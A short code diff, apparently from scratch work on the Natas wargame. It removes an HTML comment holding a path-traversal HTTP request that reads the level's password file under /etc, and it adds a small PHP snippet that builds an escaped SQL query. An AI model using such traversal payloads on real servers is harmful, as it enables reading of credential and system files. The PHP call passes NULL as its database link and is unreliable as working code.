@@ -1,1 +1,6 @@
-<!-- GET /?lang[]=....//....//....//....//....//etc/natas_&lang[]=webpass/natas26 HTTP/1.1 -->
+<?php
+
+$usr = "username";
+$user = mysqli_escape_string(NULL,$usr);
+$query = "SELECT * from users where username='$user'";
+echo $query;
